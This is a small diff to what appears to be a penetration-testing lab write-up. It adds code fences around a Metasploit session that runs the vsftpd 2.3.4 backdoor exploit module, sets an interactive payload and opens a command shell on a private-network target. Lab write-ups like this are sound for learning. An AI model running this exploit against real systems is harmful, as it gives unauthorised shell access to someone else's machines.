@@ -128,7 +128,7 @@ Still no luck
 
 **Got into the shell forgot to set the payload**
 
-
+```
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload 0
 payload => cmd/unix/interact
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
@@ -140,5 +140,5 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 [*] Found shell.
 ls
 [*] Command shell session 1 opened (172.16.0.24:45667 -> 172.16.0.22:6200) at 2022-11-01 15:42:09 -0400
-
+```
 
